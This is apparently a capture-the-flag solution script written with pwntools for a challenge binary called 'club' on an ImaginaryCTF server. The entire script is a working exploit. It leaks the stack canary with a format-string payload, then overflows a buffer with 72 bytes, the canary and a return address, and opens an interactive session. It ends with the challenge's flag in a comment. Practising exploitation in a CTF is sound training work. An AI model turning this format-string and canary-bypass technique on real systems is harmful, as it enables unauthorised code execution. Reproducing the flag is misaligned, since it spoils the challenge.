from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

io = process("./club")
io = remote("puzzler7.imaginaryctf.org", 3003)
io.sendline(b"%45$p")
io.recvuntil(b"Welcome IN, ")
canary = int(io.recvuntil(b".")[:-1], 16)
print(f"{canary = :#x}")
io.sendline(b"x" * 72 + flat([canary, 0, 0x401183]))
io.interactive()
# ictf{ESCHEW_fIVE_is_not_flag_format_friendly}
